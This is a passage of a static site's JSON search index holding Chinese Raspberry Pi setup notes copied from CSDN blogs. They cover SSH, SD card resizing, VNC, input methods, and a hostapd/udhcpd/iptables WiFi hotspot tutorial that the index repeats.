\u5982\u679c\u6ca1\u6709\u5219\u53ef\u4ee5\u8fd9\u6837\u542f\u52a8\uff1asudo/etc/init.d/sshstart\u6216\u8005servicesshstart sudo /etc/init.d/ssh restart\u91cd\u542f ssh-server\u914d\u7f6e\u6587\u4ef6\u4e3a\uff1a/etc/ssh/sshd_config\uff0c\u66f4\u6539\u914d\u7f6e\u9700\u91cd\u542fSSH\u670d\u52a1\u3002","title":"2.\u8bbe\u7f6eSSH"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#3","text":"\u8f93\u5165sudo fdisk /dev/mmcblk0\u540e\u30100\u96f6 \uff0cl\u5c0f\u5199L\u3011 d \u56de\u8f66 2 \u56de\u8f66 n \u56de\u8f66 p \u56de\u8f66 2\u56de\u8f66 \u7136\u540e\u63d0\u793afirst xxxx \u8fd9\u65f6\u5019\u6309 \u56de\u8f66 \u4e4b\u540e\u63d0\u793aLast xxxxx \u6309\u56de\u8f66 \u6700\u540e\u6309w \u56de\u8f66 sudo reboot \u91cd\u542f\u540e \u518d\u6253\u5f00\u7ec8\u7aef\u8f93\u5165sudo resize2fs /dev/mmcblk0p2 sudo reboot \u8be6\u7ec6 \uff1a \u6269\u5c55\u6811\u8393\u6d3e\u4e2d\u7684SD\u5361\u7a7a\u95f4","title":"3.\u6269\u5c55\u53ef\u7528\u7a7a\u95f4"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#4vnc","text":"1\u3001sudo apt-get update 2\u3001sudo apt-get install tightvncserver 3\u3001\u5f00\u542f\u670d\u52a1\u5668 tightvncserver \u5907\u6ce8\uff1a\u7b2c\u4e00\u4e2a\u5f00\u542f\u9700\u8981\u914d\u7f6e\u5bc6\u7801 4\u3001VCN\u7684\u7b80\u5355\u63a7\u5236 1) \u505c\u6b62VNC\u7a97\u53e3\uff1avncserver -kill:1 2) \u4fee\u6539\u5bc6\u7801\uff1avncpasswd 3) \u91cd\u542f\u670d\u52a1\u5668\uff1aservice vncserver restart \u8fdc\u7a0b\u684c\u9762\uff08mstsc.exe\uff09\u8fde\u63a5\u6811\u8393\u6d3e sudo``apt-get``install``xrdp","title":"4.\u5b89\u88c5VNC"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#5","text":"\u6811\u8393\u6d3e-\u8bbe\u7f6e\u5c4f\u5e55\u5206\u8fa9\u7387.note \u6811\u8393\u6d3e\u5c4f\u5e55\u65cb\u8f6c\u89d2\u5ea6\u53c2\u6570.note \u6811\u8393\u6d3e \u914d\u7f6e\u6587\u6863 config.txt \u8bf4\u660e .note","title":"5.\u8bbe\u7f6e\u5206\u8fa8\u7387"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#6samba","text":"Ubuntu15.04\u5b89\u88c5samba\u670d\u52a1.note","title":"6.\u5b89\u88c5samba"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#7","text":"\u6253\u5f00 \u63a7\u5236\u4e2d\u5fc3 \uff08\u5728\u9762\u677f\u7684\u7cfb\u7edf\u91cc\uff09\u70b9\u51fblanguages support \u68c0\u67e5\u8bed\u8a00\u7cfb\u7edf \u70b9\u51fb\u5b89\u88c5 \u91cd\u542f\u5373\u53ef","title":"7\uff0c\u8bbe\u7f6e\u4e2d\u6587"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#8","text":"\u8fd9\u91cc\u5b89\u88c5\u7684\u662ffcitx\u7684\u62fc\u97f3\u8f93\u5165\u6cd5\uff1a sudo apt-getinstall fcitx fcitx-sunpinyin sunpinyin\u662f\u57fa\u672c\u7684\u62fc\u97f3\u8f93\u5165\uff0c\u5982\u679c\u9700\u8981\u4e91\u8bcd\u5e93\u62fc\u97f3\uff0c\u4e5f\u5efa\u8bae\u5b89\u88c5google\u62fc\u97f3\u548c\u4e91\u62fc\u97f3 sudo apt-getinstall fcitx-googlepinyin sudo apt-getinstall fcitx-module-cloudpinyin \u53e6\u4e00\u4e2a\u5f00\u6e90\u8f93\u5165\u6cd5RIME\u5728\u6811\u8393\u6d3e\u4e0b\u6548\u679c\u5f88\u597d\uff0c\u57fa\u4e8efcitx\u5b89\u88c5\u4e5f\u5f88\u65b9\u4fbf 1. sudo apt-get install fcitx-rime ubuntu\u5982\u4f55\u5c06\u4e2d\u6587\u8f93\u5165\u6cd5\u5207\u6362\u6210\u82f1\u6587\u8f93\u5165\u6cd5","title":"8.\u5b89\u88c5\u4e2d\u6587\u8f93\u5165\u6cd5"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#9rootssh","text":"","title":"9.root\u8d26\u6237\u5f00\u542fSSH\u767b\u9646"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#_1","text":"\u6811\u8393\u6d3eraspi2-ubuntu meta\u5b89\u88c5\u914d\u7f6e\u6307\u5bfc \u6811\u8393\u6d3e\u4e0aUbuntu14.04 mate\u8bbe\u7f6e Ubuntu mate \u7cfb\u7edf\u914d\u7f6e > \u6811\u8393\u6d3e\u5427 (baidu) VMware\u4e0aUbuntu\u6587\u4ef6\u5171\u4eab Ubuntu\u4e2d\u6587\u667a\u80fd\u62fc\u97f3\u8f93\u5165\u6cd5\u914d\u7f6e Ubuntu\u4e0bFcitx\u8f93\u5165\u6cd5\u7684\u5b89\u88c5\u4e0e\u914d\u7f6e \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/machh/article/details/51299627","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B6%E2%80%94%E2%80%94%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9_%E8%80%81%E5%BE%902014-CSDN%E5%8D%9A%E5%AE%A2_%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9/","text":"\u6811\u8393\u6d3e\u5f00\u53d1\u7cfb\u5217\u6559\u7a0b6\u2014\u2014\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9_\u8001\u5f902014-CSDN\u535a\u5ba2_\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9 \u539f\u7406\uff1aPi\u4f7f\u7528\u6709\u7ebf\u8fde\u5165\u7f51\u7edc\uff0c\u7136\u540e\u63a5USB\u65e0\u7ebf\u7f51\u5361\u4f5c\u4e3a\u70ed\u70b9\uff0c\u63d0\u4f9bWifi\u63a5\u5165\u3002 1\u3001USB\u65e0\u7ebf\u7f51\u5361\u9a71\u52a8 \u5982\u679c\u63a5\u4e0aUSB\u65e0\u7ebf\u7f51\u5361\uff0c\u4f7f\u7528ifconfig\u547d\u4ee4\uff0c\u80fd\u76f4\u63a5\u770b\u5230wlan0\uff0c\u90a3\u4e48\u606d\u559c\u4f60\uff0c\u53ef\u4ee5\u76f4\u63a5\u8df3\u8fc7\u8fd9\u4e00\u6b65\u3002 \u5982\u679c\u6ca1\u6709\u8bf7\u67e5\u8be2\u4e00\u4e0b\u6811\u8393\u6d3e\u652f\u6301\u7684USB\u65e0\u7ebf\u7f51\u5361\u578b\u53f7\uff0c\u53ef\u53c2\u8003\u4ee5\u4e0b\u7f51\u5740\uff1a http://elinux.org/RPi_VerifiedPeripherals#USB_Wi-Fi_Adapters 2\u3001\u4fee\u6539wlan0\u4e3a\u9759\u6001IP *\u76f8\u5f53\u4e8e\u8bbe\u7f6e\u8def\u7531\u5668lan\u53e3IP,\u5373\u6211\u4eec\u8bbf\u95ee\u8def\u7531\u5668\u901a\u5e38\u4f7f\u7528\u7684:192.168.1.1 * sudo vim /etc/network/interfaces \u628a\u539f\u6765\u5173\u4e8ewlan0\u7684\u6ce8\u91ca\u6389\uff1a \uff08\u53ef\u80fd\u8ddf\u8fd9\u4e2a\u4e0d\u4e00\u6837\uff0c\u8ddfwlan0\u6709\u5173\u7684\u6ce8\u91ca\u6389\u5373\u53ef\uff09 auto wlan0 #iface wlan0 inet dhcp #wpa-ssid \"360WiFi-li\" #wpa-psk \"xiaolizi\" \u6dfb\u52a0\u4e0b\u9762\u7684\uff1a iface wlan0 inet static address 192.168.0.1 netmask 255.255.255.0 gateway 192.168.0.1 \u5b8c\u6210\u4e4b\u540e\u9700\u8981\u91cd\u542f 3\u3001\u5b89\u88c5hostapd *\u5b98\u65b9\u7684hostapd\u4e0d\u652f\u63018188CUS\uff0c\u540e\u9762\u9700\u8981\u91cd\u65b0\u5378\u8f7d\u5b89\u88c5\u65b0\u7684 * *\u7b14\u8005\u6d4b\u8bd5\u8c8c\u4f3c\u8fd9\u91cc\u5fc5\u987b\u5148\u88c5\u65e7\u7684\uff0c\u7136\u540e\u540e\u9762\u5378\u4e86\u88c5\u65b0\u7684\uff0c\u5426\u5219\u4e5f\u4e0d\u80fd\u7528 * sudo apt-get install hostapd 1\uff09\u7f16\u8f91hostapd \u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\uff1a sudo vim /etc/default/hostapd \u627e\u5230#DAEMON_CONF= \"\"\uff0c\u4fee\u6539\u4e3a\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" 2\uff09\u7136\u540e\u7f16\u8f91\uff1asudo vim /etc/hostapd/hostapd.conf \u589e\u52a0\u4ee5\u4e0b\u4ee3\u7801\uff1a # Basic configuration interface=wlan0 ssid=raspberrywifi channel=1 #bridge=br0 # WPA and WPA2 configuration macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=3 wpa_passphrase=12345678 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP # Hardware configuration driver=rtl871xdrv ieee80211n=1 hw_mode=g device_name=RTL8192CU manufacturer=Realtek \u4fee\u6539wifi\u540d\u548c\u5bc6\u7801 ssid=raspberrywifi wpa_passphrase=12345678 3\uff09\u4fdd\u5b58\u9000\u51fa\uff0c\u7136\u540e\u91cd\u542f\u670d\u52a1\uff1a sudo service hostapd restart \u6216\u8005\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u751f\u6548 sudo hostapd -dd /etc/hostapd/hostapd.conf 4\uff09\u5982\u679c\u4f60\u4f7f\u7528\u7684\u7f51\u5361\u63d0\u793a\u4e00\u4e0b\u4fe1\u606f Configuration file: /etc/hostapd/hostapd.conf nl80211: 'nl80211' generic netlink not found Failed to initialize driver 'nl80211' rmdir[ctrl_interface]: No such file or directory \u90a3\u4e48\uff0c\u8fd8\u662f\u8981\u4f7f\u7528\u7b2c\u4e09\u65b9\u7684hostapd\u3002 4\u3001\u5b89\u88c5\u65b0\u7684hostapd 1)\u5220\u9664\u539f\u6765\u7684hostapd\uff08\u7b14\u8005\u6d4b\u8bd5\uff0c\u4e0d\u5378\u8f7d\u8c8c\u4f3c\u4e5f\u884c\uff09 sudo apt-get autoremove hostapd 2)\u4e0b\u8f7d\u7b2c\u4e09\u65b9\u9a71\u52a8\u5e76\u5b89\u88c5 wget https://github.com/jenssegers/RTL8188-hostapd/archive/v1.1.tar.gz tar -zxvf v1.1.tar.gz 3)\u7f16\u8bd1\uff1a cd RTL8188-hostapd-1.1/hostapd sudo make sudo make install 4)\u7136\u540e\u518d\u91cd\u542f\u670d\u52a1\uff0c\u5e94\u8be5\u63d0\u793a\u6210\u529f\uff1a $ sudo service hostapd restart [ ok ] Stopping advanced IEEE 802.11 management: hostapd. [ ok ] Starting advanced IEEE 802.11 management: hostapd. 5)\u5c06hostapd\u52a0\u5165\u5f00\u673a\u81ea\u542f\u52a8 *sudo service hostapd start * sudo update-rc.d hostapd enable \u7b14\u8005\u8fd9\u91cc\u63d0\u793a\u7684\u8fd8\u662f\u5931\u8d25\uff0c\u4f46\u662f\u91cd\u542f\u540e\u7f51\u7edc\u786e\u5b9e\u5efa\u7acb\u6210\u529f\uff0c\u7528\u624b\u673a\u53ef\u4ee5\u641c\u5230\u8fd9\u4e2a\u7f51\u7edc 5\u3001\u5b89\u88c5DHCP\u670d\u52a1 \u4ee5\u4e0a\u6b65\u9aa4\u5efa\u7acb\u8d77\u4e86wifi\u70ed\u70b9\uff0c\u4f46\u662f\u65e0\u6cd5\u81ea\u52a8\u83b7\u53d6ip\uff0c\u9700\u8981\u4ee5\u4e0b\u6b65\u9aa4 sudo apt-get install udhcpd 1)\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\uff1a sudo vim /etc/udhcpd.conf //\u4fee\u6539\u4ee5\u4e0b\u4fe1\u606f\uff0cstart\u548cend\u662f\u91cd\u70b9\uff0c\u6ce8\u610f\u8ddf\u7b2c\u4e00\u6b65\u7684\u9759\u6001ip\u5728\u4e00\u4e2a\u7f51\u6bb5 start 192.168.0.20 end 192.168.0.200 interface wlan0 2)\u63a5\u4e0b\u6765\u7f16\u8f91/etc/default/udhcpd\u5e76\u4e14\u5c06\u4e0b\u9762\u8fd9\u884c\u6ce8\u91ca\u6389\uff0c\u4ee5\u4f7fDHCP Server\u6b63\u5e38\u5de5\u4f5c\uff1a #DHCPD_ENABLED=\"no\" 3)\u542f\u52a8dhcp\u670d\u52a1\u5668 *sudo service udhcpd start * sudo update-rc.d udhcpd enable \u7ecf\u8fc7\u6b64\u6b65\u624b\u673a\u5df2\u7ecf\u53ef\u4ee5\u63a5\u5165wifi\u7f51\u7edc\uff0c\u5e76\u4e14\u81ea\u52a8\u83b7\u53d6ip 6\u3001\u914d\u7f6e\u8def\u7531\u8f6c\u53d1 \u7406\u8bba\u4e0a\u662f\u7ecf\u8fc7\u8fd9\u4e00\u6b65\uff0c\u624b\u673a\u53ef\u4ee5\u901a\u8fc7\u5171\u4eab\u6811\u8393\u6d3e\u7684\u65e0\u7ebf\u7f51\u7edc\u4e0a\u7f51\u4e86\uff0c\u4f46\u662f\u7b14\u8005\u4e00\u76f4\u6ca1\u6709\u6210\u529f 1)\u8bbe\u7f6e\u8def\u7531\u6620\u5c04\u89c4\u5219 sudo iptables -F sudo iptables -X sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT sudo bash -c iptables-save > /etc/iptables.up.rules 2)\u7f16\u8f91\uff1asudo vim /etc/network/if-pre-up.d/iptables \u6dfb\u52a0\u4e0b\u9762\u4e24\u884c\u4ee3\u7801\uff1a #!/bin/bash /sbin/iptables-restore < /etc/iptables.up.rules \u4fdd\u5b58\u9000\u51fa\uff0c\u7136\u540e\u4fee\u6539iptables\u6743\u9650\uff1a sudo chmod 755 /etc/network/if-pre-up.d/iptables 4)\u5f00\u8d77\u5185\u6838\u8f6c\u53d1\uff1a sudo vim /etc/sysctl.conf \u627e\u5230\u4e0b\u9762\u4e24\u884c\uff1a #Uncomment the next line to enable packet forwarding for IPv4 #net.ipv4.ip_forward=1 \u628anet.ipv4.ip_forward \u524d\u9762\u7684#\u53bb\u6389\uff0c\u4fdd\u5b58\u9000\u51fa\u3002 \u7136\u540e :sudo sysctl -p 7\u3001\u5176\u5b83\u95ee\u9898 \u6700\u8fd1\u7ecf\u5e38\u53d1\u73b0\u65e0\u7ebf\u7f51\u5361\u914d\u7f6e\u7684DHCP\u4e0d\u80fd\u53d1\u6325\u4f5c\u7528\uff0c\u7ecf\u8fc7\u6392\u67e5\u53d1\u73b0\u7ed9\u65e0\u7ebf\u7f51\u5361\u6307\u5b9a\u7684\u9759\u6001IP\u5931\u8d25\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u65e0\u7ebf\u7f51\u5361\u6ca1\u6709IP\u5bfc\u81f4DHCP\u65e0\u6cd5\u5de5\u4f5c\uff0c\u5c06/etc/default/ifplugd\u7684\u5185\u5bb9\u4fee\u6539\u914d\u7f6e\u5982\u4e0b\uff1a INTERFACES=\"eth0\" HOTPLUG_INTERFACES=\"eth0\" ARGS=\"-q -f -u0 -d10 -w -I\" SUSPEND_ACTION=\"stop\" \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/xdw1985829/article/details/38845533","title":"\u6811\u8393\u6d3e\u5f00\u53d1\u7cfb\u5217\u6559\u7a0b6\u2014\u2014\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9 \u8001\u5f902014 CSDN\u535a\u5ba2 \u6811\u8393\u6d3e\u505awifi\u70ed\u70b9"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B6%E2%80%94%E2%80%94%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9_%E8%80%81%E5%BE%902014-CSDN%E5%8D%9A%E5%AE%A2_%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9/#6wifi_2014-csdn_wifi","text":"\u539f\u7406\uff1aPi\u4f7f\u7528\u6709\u7ebf\u8fde\u5165\u7f51\u7edc\uff0c\u7136\u540e\u63a5USB\u65e0\u7ebf\u7f51\u5361\u4f5c\u4e3a\u70ed\u70b9\uff0c\u63d0\u4f9bWifi\u63a5\u5165\u3002 1\u3001USB\u65e0\u7ebf\u7f51\u5361\u9a71\u52a8 \u5982\u679c\u63a5\u4e0aUSB\u65e0\u7ebf\u7f51\u5361\uff0c\u4f7f\u7528ifconfig\u547d\u4ee4\uff0c\u80fd\u76f4\u63a5\u770b\u5230wlan0\uff0c\u90a3\u4e48\u606d\u559c\u4f60\uff0c\u53ef\u4ee5\u76f4\u63a5\u8df3\u8fc7\u8fd9\u4e00\u6b65\u3002 \u5982\u679c\u6ca1\u6709\u8bf7\u67e5\u8be2\u4e00\u4e0b\u6811\u8393\u6d3e\u652f\u6301\u7684USB\u65e0\u7ebf\u7f51\u5361\u578b\u53f7\uff0c\u53ef\u53c2\u8003\u4ee5\u4e0b\u7f51\u5740\uff1a http://elinux.org/RPi_VerifiedPeripherals#USB_Wi-Fi_Adapters 2\u3001\u4fee\u6539wlan0\u4e3a\u9759\u6001IP *\u76f8\u5f53\u4e8e\u8bbe\u7f6e\u8def\u7531\u5668lan\u53e3IP,\u5373\u6211\u4eec\u8bbf\u95ee\u8def\u7531\u5668\u901a\u5e38\u4f7f\u7528\u7684:192.168.1.1 * sudo vim /etc/network/interfaces \u628a\u539f\u6765\u5173\u4e8ewlan0\u7684\u6ce8\u91ca\u6389\uff1a \uff08\u53ef\u80fd\u8ddf\u8fd9\u4e2a\u4e0d\u4e00\u6837\uff0c\u8ddfwlan0\u6709\u5173\u7684\u6ce8\u91ca\u6389\u5373\u53ef\uff09","title":"\u6811\u8393\u6d3e\u5f00\u53d1\u7cfb\u5217\u6559\u7a0b6\u2014\u2014\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9_\u8001\u5f902014-CSDN\u535a\u5ba2_\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B6%E2%80%94%E2%80%94%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9_%E8%80%81%E5%BE%902014-CSDN%E5%8D%9A%E5%AE%A2_%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9/#auto-wlan0","text":"#iface wlan0 inet dhcp #wpa-ssid \"360WiFi-li\" #wpa-psk \"xiaolizi\" \u6dfb\u52a0\u4e0b\u9762\u7684\uff1a iface wlan0 inet static address 192.168.0.1 netmask 255.255.255.0 gateway 192.168.0.1 \u5b8c\u6210\u4e4b\u540e\u9700\u8981\u91cd\u542f 3\u3001\u5b89\u88c5hostapd *\u5b98\u65b9\u7684hostapd\u4e0d\u652f\u63018188CUS\uff0c\u540e\u9762\u9700\u8981\u91cd\u65b0\u5378\u8f7d\u5b89\u88c5\u65b0\u7684 * *\u7b14\u8005\u6d4b\u8bd5\u8c8c\u4f3c\u8fd9\u91cc\u5fc5\u987b\u5148\u88c5\u65e7\u7684\uff0c\u7136\u540e\u540e\u9762\u5378\u4e86\u88c5\u65b0\u7684\uff0c\u5426\u5219\u4e5f\u4e0d\u80fd\u7528 * sudo apt-get install hostapd 1\uff09\u7f16\u8f91hostapd \u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\uff1a sudo vim /etc/default/hostapd \u627e\u5230#DAEMON_CONF= \"\"\uff0c\u4fee\u6539\u4e3a\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" 2\uff09\u7136\u540e\u7f16\u8f91\uff1asudo vim /etc/hostapd/hostapd.conf \u589e\u52a0\u4ee5\u4e0b\u4ee3\u7801\uff1a # Basic configuration interface=wlan0 ssid=raspberrywifi channel=1 #bridge=br0 # WPA and WPA2 configuration macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=3 wpa_passphrase=12345678 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP # Hardware configuration driver=rtl871xdrv ieee80211n=1 hw_mode=g device_name=RTL8192CU manufacturer=Realtek \u4fee\u6539wifi\u540d\u548c\u5bc6\u7801 ssid=raspberrywifi wpa_passphrase=12345678 3\uff09\u4fdd\u5b58\u9000\u51fa\uff0c\u7136\u540e\u91cd\u542f\u670d\u52a1\uff1a sudo service hostapd restart \u6216\u8005\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u751f\u6548 sudo hostapd -dd /etc/hostapd/hostapd.conf 4\uff09\u5982\u679c\u4f60\u4f7f\u7528\u7684\u7f51\u5361\u63d0\u793a\u4e00\u4e0b\u4fe1\u606f Configuration file: /etc/hostapd/hostapd.conf nl80211: 'nl80211' generic netlink not found Failed to initialize driver 'nl80211' rmdir[ctrl_interface]: No such file or directory \u90a3\u4e48\uff0c\u8fd8\u662f\u8981\u4f7f\u7528\u7b2c\u4e09\u65b9\u7684hostapd\u3002 4\u3001\u5b89\u88c5\u65b0\u7684hostapd 1)\u5220\u9664\u539f\u6765\u7684hostapd\uff08\u7b14\u8005\u6d4b\u8bd5\uff0c\u4e0d\u5378\u8f7d\u8c8c\u4f3c\u4e5f\u884c\uff09 sudo apt-get autoremove hostapd 2)\u4e0b\u8f7d\u7b2c\u4e09\u65b9\u9a71\u52a8\u5e76\u5b89\u88c5 wget https://github.com/jenssegers/RTL8188-hostapd/archive/v1.1.tar.gz tar -zxvf v1.1.tar.gz 3)\u7f16\u8bd1\uff1a cd RTL8188-hostapd-1.1/hostapd sudo make sudo make install 4)\u7136\u540e\u518d\u91cd\u542f\u670d\u52a1\uff0c\u5e94\u8be5\u63d0\u793a\u6210\u529f\uff1a $ sudo service hostapd restart [ ok ] Stopping advanced IEEE 802.11 management: hostapd. [ ok ] Starting advanced IEEE 802.11 management: hostapd. 5)\u5c06hostapd\u52a0\u5165\u5f00\u673a\u81ea\u542f\u52a8 *sudo service hostapd start * sudo update-rc.d hostapd enable \u7b14\u8005\u8fd9\u91cc\u63d0\u793a\u7684\u8fd8\u662f\u5931\u8d25\uff0c\u4f46\u662f\u91cd\u542f\u540e\u7f51\u7edc\u786e\u5b9e\u5efa\u7acb\u6210\u529f\uff0c\u7528\u624b\u673a\u53ef\u4ee5\u641c\u5230\u8fd9\u4e2a\u7f51\u7edc 5\u3001\u5b89\u88c5DHCP\u670d\u52a1 \u4ee5\u4e0a\u6b65\u9aa4\u5efa\u7acb\u8d77\u4e86wifi\u70ed\u70b9\uff0c\u4f46\u662f\u65e0\u6cd5\u81ea\u52a8\u83b7\u53d6ip\uff0c\u9700\u8981\u4ee5\u4e0b\u6b65\u9aa4 sudo apt-get install udhcpd 1)\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\uff1a sudo vim /etc/udhcpd.conf //\u4fee\u6539\u4ee5\u4e0b\u4fe1\u606f\uff0cstart\u548cend\u662f\u91cd\u70b9\uff0c\u6ce8\u610f\u8ddf\u7b2c\u4e00\u6b65\u7684\u9759\u6001ip\u5728\u4e00\u4e2a\u7f51\u6bb5 start 192.168.0.20 end 192.168.0.200 interface wlan0 2)\u63a5\u4e0b\u6765\u7f16\u8f91/etc/default/udhcpd\u5e76\u4e14\u5c06\u4e0b\u9762\u8fd9\u884c\u6ce8\u91ca\u6389\uff0c\u4ee5\u4f7fDHCP Server\u6b63\u5e38\u5de5\u4f5c\uff1a #DHCPD_ENABLED=\"no\" 3)\u542f\u52a8dhcp\u670d\u52a1\u5668 *sudo service udhcpd start * sudo update-rc.d udhcpd enable \u7ecf\u8fc7\u6b64\u6b65\u624b\u673a\u5df2\u7ecf\u53ef\u4ee5\u63a5\u5165wifi\u7f51\u7edc\uff0c\u5e76\u4e14\u81ea\u52a8\u83b7\u53d6ip 6\u3001\u914d\u7f6e\u8def\u7531\u8f6c\u53d1 \u7406\u8bba\u4e0a\u662f\u7ecf\u8fc7\u8fd9\u4e00\u6b65\uff0c\u624b\u673a\u53ef\u4ee5\u901a\u8fc7\u5171\u4eab\u6811\u8393\u6d3e\u7684\u65e0\u7ebf\u7f51\u7edc\u4e0a\u7f51\u4e86\uff0c\u4f46\u662f\u7b14\u8005\u4e00\u76f4\u6ca1\u6709\u6210\u529f 1)\u8bbe\u7f6e\u8def\u7531\u6620\u5c04\u89c4\u5219 sudo iptables -F sudo iptables -X sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT sudo bash -c iptables-save > /etc/iptables.up.rules 2)\u7f16\u8f91\uff1asudo vim /etc/network/if-pre-up.d/iptables \u6dfb\u52a0\u4e0b\u9762\u4e24\u884c\u4ee3\u7801\uff1a #!/bin/bash /sbin/iptables-restore < /etc/iptables.up.rules \u4fdd\u5b58\u9000\u51fa\uff0c\u7136\u540e\u4fee\u6539iptables\u6743\u9650\uff1a sudo chmod 755 /etc/network/if-pre-up.d/iptables 4)\u5f00\u8d77\u5185\u6838\u8f6c\u53d1\uff1a sudo vim /etc/sysctl.conf \u627e\u5230\u4e0b\u9762\u4e24\u884c\uff1a #Uncomment the next line to enable packet forwarding for IPv4 #net.ipv4.ip_forward=1 \u628anet.ipv4.ip_forward \u524d\u9762\u7684#\u53bb\u6389\uff0c\u4fdd\u5b58\u9000\u51fa\u3002 \u7136\u540e :sudo sysctl -p 7\u3001\u5176\u5b83\u95ee\u9898 \u6700\u8fd1\u7ecf\u5e38\u53d1\u73b0\u65e0\u7ebf\u7f51\u5361\u914d\u7f6e\u7684DHCP\u4e0d\u80fd\u53d1\u6325\u4f5c\u7528\uff0c\u7ecf\u8fc7\u6392\u67e5\u53d1\u73b0\u7ed9\u65e0\u7ebf\u7f51\u5361\u6307\u5b9a\u7684\u9759\u6001IP\u5931\u8d25\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u65e0\u7ebf\u7f51\u5361\u6ca1\u6709IP\u5bfc\u81f4DHCP\u65e0\u6cd5\u5de5\u4f5c\uff0c\u5c06/etc/default/ifplugd\u7684\u5185\u5bb9\u4fee\u6539\u914d\u7f6e\u5982\u4e0b\uff1a INTERFACES=\"eth0\" HOTPLUG_INTERFACES=\"eth0\" ARGS=\"-q -f -u0 -d10 -w -I\" SUSPEND_ACTION=\"stop\" \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/xdw1985829/article/details/38845533","title":"auto 